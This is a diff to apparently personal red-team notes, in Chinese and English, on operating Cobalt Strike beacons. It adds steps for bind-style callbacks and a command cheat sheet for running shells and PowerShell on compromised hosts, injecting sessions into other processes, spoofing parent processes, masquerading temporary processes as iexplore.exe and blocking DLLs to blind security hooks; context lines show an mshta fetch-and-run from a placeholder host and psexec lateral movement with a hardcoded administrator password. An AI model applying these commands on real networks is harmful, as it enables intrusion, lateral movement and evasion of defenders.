@@ -66,7 +66,8 @@ mshta http://xx/file.hta
 ```
 ### 多种上线方式/内网/代理
 
-[1.SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
+0. bind方式上线
+1. [SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
 2. 中转listenr, 用 tcp Listener, 步骤同1
 3. 代理上线 goproxy
 4. 正向tcp
@@ -76,6 +77,12 @@ mshta http://xx/file.hta
 
 5. pystinger
 
+0.bind方式上线
+```
+1) 生成 Stageless payload, 在目标机运行
+2) 右击跳板机Session - Interactive
+3) bind 目标ip
+```
 1.SMB bacon
 ```shell
 1.新建 smb listener
@@ -153,6 +160,78 @@ beacon > rev2self # 恢复原始令牌
 beacon > make_token teamssix\administrator Test123!
 beacon > jump psexec_psh 192.168.175.200 smb
 ```
+
+* Agent Context
+  - cd, pwd, setenv
+- File System
+  - cp,drives,is,mkdir,mv,rm
+  - download,upload
+* Process Management
+  - kill,ps
+* Query the Registry
+  - reg query,reg queryv
+<br><br>
+
+* Console Tips
+  - `Ctrl+D` closes the console (or other active tab)
+  - `Ctrl+K` clears the console screen
+  - `Ctrl+F` opens a find tool to search the console (works in most other tabs too)
+* Beacon Management
+  - Use the `clear` command if you mess up
+
+__Execute__
+* Run a command,get output
+  * `run command`
+* Change to another folder
+  * `cd c:\folder`
+* Print the working directory
+  * `pwd`
+<br>
+
+* __Use PowerShell through Beacon__
+* Import a script:
+  * `powershell-import /path/to/local.ps1`
+* Use script:
+  * `powershell cmdlet args`
+* Get help for a script:
+  * `powershell Get-Help cmdlet-Full`
+<br><br>
+
+* __Use a NET assembly through Beacon__
+  * `execute-assembly [/local/file.exe][args]`
+* Run a command via cmd.exe
+  * `shell [command][args]`
+* Use PowerShell without powershell.exe
+  * `powerpick [cmdlet][args]`
+* Run PowerShell within another process
+  * `psinject [pid][arch][cmdlet][args]`
+
+
+__Session__ 
+右击 - Note , 加备注
+
+__Session Passing__ 
+
+* Spawn and Inject
+  - `[beacon]` -> `Spawn` or `spawn [arch][listener]`
+* Spawn with alternate parent and Inject
+  - `spawnu [pid][listener]`
+* Inject into specific process
+  - `inject [pid][arch][listener]`
+
+
+__Session Prepping__ 
+* Configure "safe" temporary processes
+  - Use `ps` to survey processes on target
+  - Use `ppid` to anchor to a specific parent process， 
+  - Use `spawnto [arch][path][args]` to change program Cobalt Strike launches for temporary processes
+  - Use `blockdlls start` to enable DLL blocking (blinds userland hooks `[caveats apply]` on Windows 10)
+<br>
+
+1. 方式1. 右击 Session - Explore - Process List - 选一个进程 Inject
+  - 右击某进程 - 设置为PPID, 使用spawn时, 会以新PPID生成
+2. 方式2. `bacon > spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`
+
 ## Plugins
 
 ### CrossC2/上线Linux
